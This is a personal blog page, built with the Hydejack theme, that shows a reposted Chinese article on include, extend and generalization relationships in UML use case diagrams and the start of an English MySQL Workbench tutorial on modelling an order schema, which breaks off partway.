<!DOCTYPE html>
<html lang="en"><!--
 __  __                __                                     __
/\ \/\ \              /\ \             __                    /\ \
\ \ \_\ \   __  __    \_\ \      __   /\_\      __       ___ \ \ \/'\
 \ \  _  \ /\ \/\ \   /'_` \   /'__`\ \/\ \   /'__`\    /'___\\ \ , <
  \ \ \ \ \\ \ \_\ \ /\ \L\ \ /\  __/  \ \ \ /\ \L\.\_ /\ \__/ \ \ \\`\
   \ \_\ \_\\/`____ \\ \___,_\\ \____\ _\ \ \\ \__/.\_\\ \____\ \ \_\ \_\
    \/_/\/_/ `/___/> \\/__,_ / \/____//\ \_\ \\/__/\/_/ \/____/  \/_/\/_/
                /\___/                \ \____/
                \/__/                  \/___/

Powered by Hydejack v6.6.1 <https://qwtel.com/hydejack/>
--><head> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1"> <meta name="format-detection" content="telephone=no"> <meta http-equiv="x-ua-compatible" content="ie=edge"> <title>Ka's Blog &middot; Ka's Blog</title> <meta name="description" content="Ka’s blog description… "> <link rel="canonical" href="http://localhost:4000/page-55/"> <link rel="alternate" type="application/atom+xml" title="Ka's Blog Feed" href="http://localhost:4000/feed.xml"> <link rel="apple-touch-icon" href="/apple-touch-icon.png"> <!-- Place favicon.ico in the root directory --> <link rel="stylesheet" href="/assets/style.css"> <link id="_katexJS" rel="dns-prefetch" href="/assets/bower_components/katex/dist/katex.min.js"> <link id="_katexCSS" rel="dns-prefetch" href="/assets/bower_components/katex/dist/katex.min.css"> <!--[if gt IE 8]><!----> <script> WebFontConfig = { google: { families: 'Roboto+Slab:700|Noto+Sans:400,400i,700,700i'.split('|') }, custom: { families: ['icomoon'], urls: ['/assets/icomoon/style.css'] } }; </script> <!--<![endif]--> <script> !function(n,e){function t(n,e){n.onload=function(){this.onerror=this.onload=null,e(null,n)},n.onerror=function(){this.onerror=this.onload=null,e(new Error("Failed to load "+this.src),n)}}function o(n,e){n.onreadystatechange=function(){"complete"!=this.readyState&&"loaded"!=this.readyState||(this.onreadystatechange=null,e(null,n))}}n._loaded=!1,n.loadJSDeferred=function(a,d){function r(){n._loaded=!0;var r=e.createElement("script");r.src=a,d&&(("onload"in r?t:o)(r,d),r.onload||t(r,d));var l=e.getElementsByTagName("script")[0];l.parentNode.insertBefore(r,l)}n._loaded?r():n.addEventListener?n.addEventListener("load",r,!1):n.attachEvent?n.attachEvent("onload",r):n.onload=r}}(window,document); !function(a){"use strict";var b=function(b,c,d){function e(a){return h.body?a():void setTimeout(function(){e(a)})}function f(){i.addEventListener&&i.removeEventListener("load",f),i.media=d||"all"}var g,h=a.document,i=h.createElement("link");if(c)g=c;else{var j=(h.body||h.getElementsByTagName("head")[0]).childNodes;g=j[j.length-1]}var k=h.styleSheets;i.rel="stylesheet",i.href=b,i.media="only x",e(function(){g.parentNode.insertBefore(i,c?g:g.nextSibling)});var l=function(a){for(var b=i.href,c=k.length;c--;)if(k[c].href===b)return a();setTimeout(function(){l(a)})};return i.addEventListener&&i.addEventListener("load",f),i.onloadcssdefined=l,l(f),i};"undefined"!=typeof exports?exports.loadCSS=b:a.loadCSS=b}("undefined"!=typeof global?global:this); !function(a){if(a.loadCSS){var b=loadCSS.relpreload={};if(b.support=function(){try{return a.document.createElement("link").relList.supports("preload")}catch(b){return!1}},b.poly=function(){for(var b=a.document.getElementsByTagName("link"),c=0;c<b.length;c++){var d=b[c];"preload"===d.rel&&"style"===d.getAttribute("as")&&(a.loadCSS(d.href,d,d.getAttribute("media")),d.rel=null)}},!b.support()){b.poly();var c=a.setInterval(b.poly,300);a.addEventListener&&a.addEventListener("load",function(){b.poly(),a.clearInterval(c)}),a.attachEvent&&a.attachEvent("onload",function(){a.clearInterval(c)})}}}(this); window.disablePushState = false; window.disableDrawer = false; </script> <!--[if lt IE 9]> <script src="/assets/bower_components/html5shiv/dist/html5shiv.min.js"></script> <![endif]--> <!--[if gt IE 8]><!----> <style> article, aside, dialog, figcaption, figure, footer, header, hgroup, main, nav, section { display: block; } mark { background: #FF0; color: #000; } * { box-sizing: border-box; } html, body { margin: 0; padding: 0; } html { font-size: 16px; line-height: 1.75; } body { color: #333; background-color: #fff; overflow-y: scroll; } a { text-decoration: none; } .lead { margin-left: -1rem; margin-right: -1rem; } img, .img { display: block; max-width: 100%; margin-bottom: 1rem; border: none; } img.lead, .img.lead { max-width: calc(100% + 2rem); width: calc(100% + 2rem); } h1, h2, h3, h4, h5, h6, .h1, .h2, .h3, .h4, .h5, .h6, .heading { font-weight: bold; text-rendering: optimizeLegibility; } h1, h2, h3, h4, h5, h6, .h1, .h2, .h3, .h4, .h5, .h6 { margin: 3rem 0 1rem; line-height: 1.6; } h1, .h1 { font-size: 2rem; line-height: 1.25; } h2, .h2 { font-size: 1.5rem; } h3, .h3 { font-size: 1.17em; } p { margin-top: 0; margin-bottom: 1rem; } p.lead { font-size: 1.25rem; font-weight: 300; padding: 0 1rem; } ul, ol, dl { margin-top: 0; margin-bottom: 1rem; } ul, ol { padding-left: 1.25rem; } hr { position: relative; margin: 1.5rem 0; border: 0; border-top: 1px solid #eee; } .hr { padding-bottom: .5rem; border-bottom: 1px solid #eee; margin-bottom: 1.5rem; } h4, h5, h6, .h4, .h5, .h6 { margin-bottom: 0.5rem; font-size: 1rem; } table { margin-bottom: 1rem; width: 100%; width: calc(100% + 2rem); margin-left: -1rem; border: 1px solid #e5e5e5; border-collapse: collapse; border-spacing: 0; } td, th { padding: .25rem .5rem; border: 1px solid #e5e5e5; } td:first-child, th:first-child { padding-left: 1rem; } td:last-child, th:last-child { padding-right: 1rem; } thead + tbody, tbody + tbody, tfoot { border-top: 3px double #e5e5e5; } tbody tr:nth-child(odd) td, tbody tr:nth-child(odd) th { background-color: #f9f9f9; } footer { margin-bottom: 2rem; } .page, .post { margin-bottom: 3em; } .page li + li, .post li + li { margin-top: .25rem; } .page > header, .post > header { margin-bottom: 2rem; } .page-title, .post-title { margin-top: 0; } .post-date { display: block; margin-top: -0.5rem; margin-bottom: 1rem; color: #9a9a9a; } .related-posts { padding-left: 0; list-style: none; } .related-posts > li, .related-posts > li + li { margin-top: 1rem; } .related-posts > li > small, .related-posts > li + li > small { font-size: 75%; color: #9a9a9a; } .message { margin-bottom: 1rem; padding: 1rem; color: #787878; background-color: #f9f9f9; margin-left: -1rem; margin-right: -1rem; } /* * Global resets * * Update the foundational and global aspects of the page. */ body, main { /* Prevent side-scrolling on mobile */ position: relative; overflow-x: hidden; } @media screen { body::before { content: ''; width: .5rem; background: #e5e5e5; position: absolute; left: 0; top: 0; bottom: 0; } } @media screen and (min-width: 40em) { html { font-size: 17px; } } @media screen and (min-width: 54em) { html { font-size: 16px; } } @media screen and (min-width: 72em) { html { font-size: 17px; } } @media screen and (min-width: 125em) { html { font-size: 18px; } } .sr-only { display: none; } .clearfix, .sidebar-social::after, .clearafter::after { content: ""; display: table; clear: both; } a, .a { position: relative; padding-bottom: .15rem; border-bottom: 1px solid; } .img { overflow: hidden; background-color: #f9f9f9; } .img > img { margin: 0; width: 100%; height: 100%; } .sixteen-nine { position: relative; } .sixteen-nine::before { display: block; content: ""; width: 100%; padding-top: 56.25%; } .sixteen-nine > * { position: absolute; top: 0; left: 0; right: 0; bottom: 0; } h1 + hr, h2 + hr, h3 + hr, h4 + hr, h5 + hr, h6 + hr { margin-top: 0; } .fade-in { animation-duration: 500ms; animation-name: fade-in; animation-fill-mode: forwards; } @keyframes fade-in { from { transform: translateY(-2rem); opacity: 0; } 50% { transform: translateY(-2rem); opacity: 0; } to { transform: translateY(0); opacity: 1; } } .mb6 { margin-bottom: 6rem; } .sidebar { color: rgba(255, 255, 255, 0.75); text-align: left; /* Sidebar links */ } .sidebar::before { /* make sidebar slightly darker to increase text readability (when using a background image) */ content: ""; position: absolute; z-index: 2; top: 0; left: 0; bottom: 0; right: 0; background: linear-gradient(to bottom, rgba(32, 32, 32, 0) 0%, rgba(32, 32, 32, 0.5) 100%); /* W3C, IE10+, FF16+, Chrome26+, Opera12+, Safari7+ */ } .sidebar a { color: #fff; border-bottom-color: rgba(255, 255, 255, 0.2); } #_yDrawer { position: relative; padding: 1rem 0; } @media screen { #_yDrawer { padding: 2rem 1rem; min-height: 640px; min-height: 100vh; } } @media screen and (min-width: 54em) { #_yDrawer { position: fixed; top: 0; left: 0; bottom: 0; width: 18rem; margin-left: 0; } } @media screen and (min-width: 97.5em) { #_yDrawer { width: calc(50% - 28rem); } } @media screen { #_yDrawer.loaded { min-height: 0; padding: 0; } } .sidebar-bg { position: absolute; top: 0; right: 0; bottom: 0; left: 0; background: #202020 center / cover; } .sidebar-sticky { position: relative; z-index: 3; } @media screen { .sidebar-sticky { position: absolute; right: 2rem; bottom: 1rem; left: auto; max-width: 14rem; } } @media print { .sidebar-sticky { padding: 0 2rem; } } /* About section */ .sidebar-about > h1 { color: #fff; font-size: 2rem; } .sidebar-nav > ul { list-style: none; padding-left: 0; margin-bottom: .5rem; } a.sidebar-nav-item { font-weight: bold; display: block; line-height: 1.75; padding: .25rem 0; border-bottom: 1px solid rgba(255, 255, 255, 0.2); } @media screen { .y-drawer-scrim { z-index: 2; } .y-drawer-content { width: 18rem; left: -17.5rem; z-index: 3; } } @media screen and (min-width: 97.5em) { .y-drawer-content { width: calc(50% - 28rem); } } .sidebar-social { margin-bottom: .5rem; } .sidebar-social > ul { list-style: none; padding-left: 0; margin: 0 -.25rem; } .sidebar-social > ul > li { float: left; margin: 0 .25rem; } .sidebar-social > ul > li > a { display: inline-block; text-align: center; font-size: 1.6rem; line-height: 3rem; width: 3.1249rem; height: 4rem; padding: .5rem 0; } .sidebar-social > ul li + li { margin-top: 0; } .fixed-top { position: fixed; top: 0; left: 0; width: 100%; z-index: 1; } .navbar > .content { padding-top: 0; padding-bottom: 0; min-height: 0; height: 0; } .menu { display: inline-block; padding: 1.75rem 1.5rem; border-bottom: none; margin-left: -1.5rem; color: #9a9a9a !important; } .menu::after { content: "\2630"; } @media screen and (min-width: 54em) { .menu { padding: 1.25rem 1.5rem; position: absolute; left: -9999px; } .menu:focus { position: static; } } .animation-main { pointer-events: none; } .loading { display: none; } @media print { .menu { display: none; } } .animation-main { opacity: 0; will-change: opacity; } .loading { position: absolute; top: 0; right: 0; padding: 5.25rem 4.5rem; transform-origin: top right; transform: scale(0.33); } .content { position: relative; margin-left: auto; margin-right: auto; padding: 5rem 1rem 12rem; } @media screen { .content { max-width: 38rem; padding-left: 1.5rem; min-height: 100vh; } } @media screen and (min-width: 54em) { .content { max-width: 42rem; padding: 4rem 1rem 12rem; margin-left: 22rem; margin-right: 4rem; } } @media screen and (min-width: 72em) { .content { margin-left: 22rem; margin-right: 4rem; } } @media screen and (min-width: 92em) { .content { max-width: 48rem; } } @media screen and (min-width: 97.5em) { .content { margin: auto; } } .me { float: right; width: 6.5rem; height: 6.5rem; margin-left: 1rem; margin-bottom: .5rem; border-radius: 100%; position: relative; } @media screen and (min-width: 40em) { .me { width: 7rem; height: 7rem; } } @media screen and (min-width: 54em) { .me { width: 6.5rem; height: 6.5rem; } } @media screen and (min-width: 60em) { .me { width: 7rem; height: 7rem; } } main > footer { position: absolute; bottom: 0; left: 0; right: 0; padding: 0 1rem; color: #9a9a9a; font-size: smaller; text-align: center; } main > footer > p { margin-bottom: 0; } /* .card, .pagination-item { border-radius: 0!important; } */ /* @media screen { .sidebar-sticky { left: 2rem; max-width: none; } } */ html { font-family: Helvetica, Arial, sans-serif; } h1, h2, h3, h4, h5, h6, .h1, .h2, .h3, .h4, .h5, .h6, .heading { font-family: Helvetica, Arial, sans-serif; } </style> <link id="_stylePreload" rel="preload" as="style" href="/assets/css/hydejack.css?v=6.6.1"> <script>document.getElementById('_stylePreload').onload=function(){this.rel='stylesheet'}</script> <!-- NOTE: These styles interact with JavsScript, so they MUST NOT be changed --> <style id="_pageStyle"> .content a { color: #4f86aa; border-color: rgba(79, 134, 170, 0.2); } .content a:hover { border-color: #4f86aa; } :focus { outline-color: #4f86aa; } ::selection { color: #fff; background: #4f86aa; } ::-moz-selection { color: #fff; background: #4f86aa; } </style> <noscript> <link rel="stylesheet" href="/assets/css/hydejack.css?v=6.6.1"> <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto+Slab:700|Noto+Sans:400,400i,700,700i"> <style> html { font-family: 'Noto Sans', Helvetica, Arial, sans-serif } h1, h2, h3, h4, h5, h6, .h1, .h2, .h3, .h4, .h5, .h6, .heading { font-family: 'Roboto Slab', Helvetica, Arial, sans-serif } </style> <link rel="stylesheet" href="/assets/icomoon/style.css"> </noscript> <!--<![endif]--> <!--[if gt IE 8]><!----> <script async src="/assets/bower_components/webfontloader/webfontloader.js"></script> <!--<![endif]--> </head> <body> <div class="navbar fixed-top"> <div class="content"> <span class="sr-only">Jump to:</span> <a id="_menu" class="menu no-hover" href="#_title"> <span class="sr-only">Menu</span> </a> </div> </div> <div id="_yPushState"> <div class="fade-in"> <main id="_main" class="content" role="main" data-color="#4f86aa" data-image=""> <article id="post-%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B/2011/06/09/%e3%80%90%e8%bd%ac%e3%80%91uml%e7%94%a8%e4%be%8b%e5%9b%be%e4%b8%ad%e5%8c%85%e5%90%abinclude%e3%80%81%e6%89%a9%e5%b1%95extend%e5%92%8c%e6%b3%9b%e5%8c%96generalization%ef%bc%89%e4%b8%89%e7%a7%8d" class="post mb6" role="article"> <header> <h1 class="post-title"> <a href="/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B/2011/06/09/e3-80-90-e8-bd-ac-e3-80-91uml-e7-94-a8-e4-be-8b-e5-9b-be-e4-b8-ad-e5-8c-85-e5-90-abinclude-e3-80-81-e6-89-a9-e5-b1-95extend-e5-92-8c-e6-b3-9b-e5-8c-96generalization-ef-bc-89-e4-b8-89-e7-a7-8d.html" data-flip="title"> 【转】UML用例图中包含(include)、扩展(extend)和泛化(generalization）三种关系详解 </a> </h1> <p class="post-date heading"> <time datetime="2011-06-09T18:34:31+08:00">09 Jun 2011</time> in <span>软件工程</span> on <span>Oo</span>, <span>Uml</span> </p> <div class="hr" style="padding-bottom:0"></div> </header> <div class="postTitle">&#160;</div> <p style="text-align: left;margin-left: 0cm;margin-right: 0cm" align="left"><font color="#4b4b4b"><font face="宋体"><font color="#ff0000"><font size="3">共性：</font></font></font><font face="宋体"><font size="3">都是从现有的用例中抽取出公共的那部分信息，作为一个单独的用例，然后通后过不同的方法来重用这个公共的用例，以减少模型维护的工作量。</font></font></font></p> <p style="text-align: left;margin-left: 0cm;margin-right: 0cm" align="left"><font color="#4b4b4b"><font face="宋体"><font size="3"> </p> <p>1</font></font><font face="宋体"><font size="3">、包含(include)</font></font></font></p> <p style="text-align: left;margin-left: 0cm;margin-right: 0cm" align="left">&#160;</p> <p style="text-align: left;margin-left: 0cm;margin-right: 0cm" align="left"><font color="#4b4b4b">&#160;&#160;&#160; <font face="宋体"><font size="3">包含关系：使用包含（Inclusion）用例来封装一组跨越多个用例的相似动作（行为片断），以便多个基（Base）用例复用。基用例控制与包含用例的 关系，以及被包含用例的事件流是否会插入到基用例的事件流中。基用例可以依赖包含用例执行的结果，但是双方都不能访问对方的属性。&#160; </p> <p>&#160;&#160; 包含关系对典型的应用就是复用，也就是定义中说的情景。但是有时当某用例的事件流过于复杂时，为了简化用例的描述，我们也可以把某一段事件流抽象成为一个被包含的用例；相反，用例划分太细时，也可以抽象出一个基用例，来包含这些细颗粒的用例。<font color="#ff0000">这种情况类似于在过程设计语言中，将程序的某一段算法封装成一个子过程，然后再从主程序中调用这一子过程。</font> </font></font></font></p> <p style="margin-left: auto;margin-right: auto"><font color="#4b4b4b">&#160;&#160; <font face="宋体"><font size="3">例如：业务中，总是存在着维护某某信息的功能，如果将它作为一个用例，那新建、编辑以及修改都要在用例详述中描述，过于复杂；如果分成新建用例、编辑用例和删除用例，则划分太细。这时包含关系可以用来理清关系。</font></font></font></p> <p style="margin-left: auto;margin-right: auto"><img src="/assets/2008121415360154.gif" /></p> <p style="margin-left: auto;margin-right: auto"> <p style="text-align: left;margin-left: 0cm;margin-right: 0cm" align="left"><font color="#4b4b4b"><font face="宋体"><font size="3">2</font></font><font face="宋体"><font size="3">、扩展(extend)</font></font></font></p> <p style="text-align: left;margin-left: 0cm;margin-right: 0cm" align="left"><font color="#4b4b4b"><font face="宋体"><font size="3">扩展关系：将基用例中一段相对独立并且可选的动作，用扩展（Extension）用例加以封装，再让它从基用例中声明的扩展点（Extension Point）上进行扩展，从而使基用例行为更简练和目标更集中。扩展用例为基用例添加新的行为。扩展用例可以访问基用例的属性，因此它能根据基用例中扩展点的当前状态来判断是否执行自己。<font color="#ff0000">但是扩展用例对基用例不可见。</font></font></font></font></p> <p style="margin-left: auto;margin-right: auto"> <p style="margin-left: auto;margin-right: auto"><font color="#4b4b4b"><font face="宋体"><font size="3">对于一个扩展用例，可以在基用例上有几个扩展点。&#160;&#160;&#160; </p> <p>例如，系统中允许用户对查询的结果进行导出、打印。对于查询而言，能不能导出、打印查询都是一样的，导出、打印是不可见的。导入、打印和查询相对独立，而且为查询添加了新行为。因此可以采用扩展关系来描述： </p> <p></font></font><img src="/assets/2008121415363984.gif" />&#160;</font></p> <p style="text-align: left;margin-left: 0cm;margin-right: 0cm" align="left"><font color="#4b4b4b"><font face="宋体"><font size="3">4</font></font><font face="宋体"><font size="3">、泛化(generalization)</font></font></font></p> <p style="text-align: left;margin-left: 0cm;margin-right: 0cm" align="left">&#160;</p> <p style="text-align: left;margin-left: 0cm;margin-right: 0cm" align="left"><font color="#4b4b4b"><font face="宋体"><font size="3">泛化关系：子用例和父用例相似，但表现出更特别的行为；<font color="#ff0000">子用例将继承父用例的所有结构、行为和关系。</font>子用例可以使用父用例的一段行为，也可以重载它。父用例通常是抽象的。在实际应用中很少使用泛化关系，子用例中的特殊行为都可以作为父用例中的备选流存在。</font></font></font></p> <p style="margin-left: auto;margin-right: auto"><font color="#4b4b4b"><font face="宋体"><font size="3">例如，业务中可能存在许多需要部门领导审批的事情，但是领导审批的流程是很相似的，这时可以做成泛化关系表示：&#160; </p> <p></font></font></font></p> <p style="margin-left: auto;margin-right: auto">&#160;</p> <p style="margin-left: auto;margin-right: auto"><img src="/assets/2008121415371662.gif" /></p> <p style="margin-left: auto;margin-right: auto"><font color="#4b4b4b"><font face="宋体"><font size="3">上面是我参考的一篇文章，觉得将三种关系的区别讲得很清晰，在此基础上结合自己的系统，对项目(在线购物系统)的用例做了整体的描绘。 </p> <p>&#160;&#160;&#160; ***************************************************************** </p> <p>&#160;&#160;&#160; (1)系统整体用例图 </p> <p><img src="/assets/2008121415382224.gif" /></font></font></font></p> <p style="margin-left: auto;margin-right: auto"><img src="/assets/2008121415400532.gif" /></p> <p style="margin-left: auto;margin-right: auto"><img src="/assets/2008121415402258.gif" /></p> <p style="margin-left: auto;margin-right: auto"><img src="/assets/2008121415403692.gif" /></p> <p style="margin-left: auto;margin-right: auto"> <p style="text-align: left;margin-left: 0cm;margin-right: 0cm" align="left"><font color="#4b4b4b"><font face="宋体"><font size="3">按照先整体用例，后子系统用例来进行描绘的，欢迎大家提出好的建议!</font></font></font></p> <p style="text-align: left;margin-left: 0cm;margin-right: 0cm" align="left"><font size="3"> <br /></font><font color="#4b4b4b"><font face="宋体"><font color="#ff0000"><font size="3">转：UML中扩展和泛化的区别</font></font></font><font size="3">&#160; </p> <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; </font><font face="宋体"><font size="3">泛化表示类似于OO术语“继承”或“多态”。UML中的Use Case泛化过程是将不同Use Case之间的可合并部分抽象成独立的父Use Case，并将不可合并部分单独成各自的子Use Case；包含以及扩展过程与泛化过程类似，但三者对用例关系的优化侧重点是不同的。如下： <br />&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; ●泛化侧重表示子用例间的互斥性； <br />&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; ●包含侧重表示被包含用例对Actor提供服务的间接性； <br />&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; ●扩展侧重表示扩展用例的触发不定性；详述如下：</font></font></font></p> <p style="text-align: left;margin-left: 0cm;margin-right: 0cm" align="left"><font color="#4b4b4b"><font size="3"> <br />&#160;&#160;&#160;&#160;&#160;&#160;&#160; </font><font face="宋体"><font size="3">既然用例是系统提供服务的UML表述，那么服务这个过程在所有用例场景中是必然发生的，但发生按照发生条件可分为如下两种情况： <br />&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; ⒈无条件发生：肯定发生的； <br />&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; ⒉有条件发生：未必发生，发生与否取决于系统状态；</font></font></font></p> <p style="text-align: left;margin-left: 0cm;margin-right: 0cm" align="left"><font color="#4b4b4b">&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; <font face="宋体"><font size="3">因此，针对用例的三种关系结合系统状态考虑，泛化与包含用例属于无条件发生的用例，而<font color="#ff0000">扩展属于有条件发生的用例</font>。进一步，用例的存在是为Actor提供服 务，但用例提供服务的方式可分为间接和直接两种，依据于此，泛化中的子用例提供的是直接服务，而包含中的被包含用例提供的是间接服务。同样，扩展用例提供的也是直接服务，但扩展用例的发生是有条件的。</font></font></font></p> <p style="text-align: left;margin-left: 0cm;margin-right: 0cm" align="left"><font color="#4b4b4b">&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; <font face="宋体"><font size="3">另外一点需要提及的是：泛化中的子用例和扩展中的扩展用例均可以作为基本用例事件的备选择流而存在。</font></font></font></p> <p style="text-align: left;margin-left: 0cm;margin-right: 0cm" align="left"><font size="3"> <br /></font></p> <p style="text-align: left;margin-left: 0cm;margin-right: 0cm" align="left"><font face="宋体"><font size="3"><font color="#0000ff">试题中抽象用例和使用关系我觉得就是指包含关系中的描述。</font></font></font></p> <p class="read-more">Continue reading <a class="heading" href="/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B/2011/06/09/e3-80-90-e8-bd-ac-e3-80-91uml-e7-94-a8-e4-be-8b-e5-9b-be-e4-b8-ad-e5-8c-85-e5-90-abinclude-e3-80-81-e6-89-a9-e5-b1-95extend-e5-92-8c-e6-b3-9b-e5-8c-96generalization-ef-bc-89-e4-b8-89-e7-a7-8d.html" data-flip="title">【转】UML用例图中包含(include)、扩展(extend)和泛化(generalization）三种关系详解</a></p> </article> <article id="post-%E6%95%B0%E6%8D%AE%E5%BA%93/2011/06/09/mysql-workbench%e4%bd%bf%e7%94%a8%e6%96%b9%e6%b3%95-2" class="post mb6" role="article"> <header> <h1 class="post-title"> <a href="/%E6%95%B0%E6%8D%AE%E5%BA%93/2011/06/09/mysql-workbench-e4-bd-bf-e7-94-a8-e6-96-b9-e6-b3-95-2.html" data-flip="title"> MySQL Workbench使用方法 </a> </h1> <p class="post-date heading"> <time datetime="2011-06-09T18:33:20+08:00">09 Jun 2011</time> in <span>数据库</span> on <span>Mysql</span> </p> <div class="hr" style="padding-bottom:0"></div> </header> <p><b>要检查默认的启动/停止/状态检查命令是否是你设置的对应的mysql服务的名称 home/serveradmin/manage server instance</b></p> <p><strong>例如sc start mysql51 中mysql51 要对应实际的服务名称（不区分大小写）</strong></p> <p><b> <br /></b></p> <p><b> <br /></b></p> <p><b>MySQL Workbench</b> is a visual database design tool recently released by MySQL AB. The tool is specifically for designing MySQL database.</p> <p>MySQL Workbench has many functions and features; this article by <b>Djoni Darmawikarta</b> shows some of them by way of an example. We’ll build a physical data model for an order system where an order can be a sale order or a purchase order, and then, <b>forward-engineer</b> our model into an MySQL database.</p> <p><b>MySQL Workbench</b> is a visual database design tool recently released by MySQL AB. The tool is specifically for designing MySQL database.</p> <p>What you build in MySQL Workbench is called physical data model. A physical data model is a data model for a specific RDBMS product; the model in this article will have some MySQL unique specifications. We can generate (<b>forward-engineer</b>) the database objects from its physical model, which in addition to tables and their columns, can also include other objects such as view.</p> <p>MySQL Workbench has many functions and features; this article by <b>Djoni Darmawikarta</b> shows some of them by way of an example. We’ll build a physical data model for an order system where an order can be a sale order or a purchase order; and then, <b>forward-engineer</b> our model into an MySQL database.</p> <p>The physical model of our example in EER diagram will look like in the following MySQL Workbench screenshot.</p> <p style="text-align: center"><img style="border-right-width: 0pt; border-top-width: 0pt; border-bottom-width: 0pt; border-left-width: 0pt" border="0" alt="Visual MySQL Database Design in MySQL Workbench" src="/assets/workbench-article-image1.png" /></p> <h1>Creating ORDER Schema</h1> <p>Let’s first create a schema where we want to store our order physical model. Click the + button (circled in red).</p> <p style="text-align: center"><img style="border-right-width: 0pt; border-top-width: 0pt; border-bottom-width: 0pt; border-left-width: 0pt" border="0" alt="Visual MySQL Database Design in MySQL Workbench" src="/assets/workbench-article-image2.png" /></p> <p>Change the new schema’s default name to ORDER. Notice that when you’re typing in the schema name, its tab name on the Physical Schemata also changes accordingly—a nice feature.</p> <p>The order schema is added to the Catalog (I circled the order schema and its objects in red).</p> <p style="text-align: center"><img style="border-right-width: 0pt; border-top-width: 0pt; border-bottom-width: 0pt; border-left-width: 0pt" border="0" alt="Visual MySQL Database Design in MySQL Workbench" src="/assets/workbench-article-image3.png" /></p> <p>Close the schema window. Confirm to rename the schema when prompted.</p> <p style="text-align: center"><img style="border-right-width: 0pt; border-top-width: 0pt; border-bottom-width: 0pt; border-left-width: 0pt" border="0" alt="Visual MySQL Database Design in MySQL Workbench" src="/assets/workbench-article-image4.png" /></p> <h1>Creating Order Tables</h1> <p>We’ll now create three tables that model the order: ORDER table and its two subtype tables: SALES_ORDER and PURCHASE_ORDER, in the ORDER schema. First of all, make sure you select the ORDER schema tab, so that the tables we’ll create will be in this schema.</p> <p>We’ll create our tables as EER diagram (EER = Enhanced Entity Relationship). So, double-click the Add Diagram button.</p> <p style="text-align: center"><img style="border-right-width: 0pt; border-top-width: 0pt; border-bottom-width: 0pt; border-left-width: 0pt" border="0" alt="Visual MySQL Database Design in MySQL Workbench" src="/assets/workbench-article-image5.png" /></p> <p>Select (click) the Table icon, and then move your mouse onto the EER Diagram canvas and click on the location you want to place the first table.</p> <p style="text-align: center"><img style="border-right-width: 0pt; border-top-width: 0pt; border-bottom-width: 0pt; border-left-width: 0pt" border="0" alt="Visual MySQL Database Design in MySQL Workbench" src="/assets/workbench-article-image6.png" /></p> <p style="text-align: center"><img style="border-right-width: 0pt; border-top-width: 0pt; border-bottom-width: 0pt; border-left-width: 0pt" border="0" alt="Visual MySQL Database Design in MySQL Workbench" src="/assets/workbench-article-image7.png" /></p> <p>Repeat for the other two tables. You can move around the tables by dragging and dropping.</p> <p style="text-align: center"><img style="border-right-width: 0pt; border-top-width: 0pt; border-bottom-width: 0pt; border-left-width: 0pt" border="0" alt="Visual MySQL Database Design in MySQL Workbench" src="/assets/workbench-article-image8.png" /></p> <p>Next, we’ll work on table1, which we’ll do so using the Workbench’s table editor. We start the table editor by right-clicking the table1 and selecting Edit Table.</p> <p style="text-align: center"><img style="border-right-width: 0pt; border-top-width: 0pt; border-bottom-width: 0pt; border-left-width: 0pt" border="0" alt="Visual MySQL Database Design in MySQL Workbench" src="/assets/workbench-article-image9.png" /></p> <p>Next, we’ll work on table1, which we’ll do so using the Workbench’s table editor. We start the table editor by right-clicking the table1 and selecting Edit Table.</p> <p>Rename the table by typing in ORDER over table1.</p> <p style="text-align: center"><img style="border-right-width: 0pt; border-top-width: 0pt; border-bottom-width: 0pt; border-left-width: 0pt" border="0" alt="Visual MySQL Database Design in MySQL Workbench" src="/assets/workbench-article-image10.png" /></p> <p>We’ll next add its columns, so select the Columns tab. Replace idORDER column name with ORDER_NO.</p> <p style="text-align: center"><img style="border-right-width: 0pt; border-top-width: 0pt; border-bottom-width: 0pt; border-left-width: 0pt" border="0" alt="Visual MySQL Database Design in MySQL Workbench" src="/assets/workbench-article-image11.png" /></p> <p>Select INT as the data type from the drop-down list.</p> <p style="text-align: center"><img style="border-right-width: 0pt; border-top-width: 0pt; border-bottom-width: 0pt; border-left-width: 0pt" border="0" alt="Visual MySQL Database Design in MySQL Workbench" src="/assets/workbench-article-image12.png" /></p> <p>We’d like this ORDER_NO column to be valued incrementally by MySQL database, so we specify it as AI column (Auto Increment).</p> <p style="margin-left: 40px; margin-right: 40px"><i>AI is a specific feature of MySQL database.</i></p> <p style="text-align: center"><img style="border-right-width: 0pt; border-top-width: 0pt; border-bottom-width: 0pt; border-left-width: 0pt" border="0" alt="Visual MySQL Database Design in MySQL Workbench" src="/assets/workbench-article-image13.png" /></p> <p>You can also specify other physical attributes of the table, such as its Collation; as well as other advanced options, such as its trigger and partioning (the Trigger and Partioning tabs).</p> <p style="text-align: center"><img style="border-right-width: 0pt; border-top-width: 0pt; border-bottom-width: 0pt; border-left-width: 0pt" border="0" alt="Visual MySQL Database Design in MySQL Workbench" src="/assets/workbench-article-image14.png" /></p> <p>Notice that on the diagram our table1 has changed to ORDER, and it has its first column, ORDER_NO. In the Catalog you can also see the three tables.</p> <p style="margin-left: 40px; margin-right: 40px"><i>The black dots on the right of the tables indicate that they’ve been included in an diagram.</i></p> <p style="text-align: center"><img style="border-right-width: 0pt; border-top-width: 0pt; border-bottom-width: 0pt; border-left-width: 0pt" border="0" alt="Visual MySQL Database Design in MySQL Workbench" src="/assets/workbench-article-image15.png" /></p> <p>&#160;</p> <hr size="1" noshade="noshade" /> <p>If you expand the ORDER folder, you’ll see the ORDER_NO column. As we define the column as a primary key, it has a key icon on its left.</p> <p style="text-align: center"><img style="border-right-width: 0pt; border-top-width: 0pt; border-bottom-width: 0pt; border-left-width: 0pt" border="0" alt="Visual MySQL Database Design in MySQL Workbench" src="/assets/workbench-article-image16.png" /></p> <p>Back to the table editor, add the other columns: ORDER_DATE and 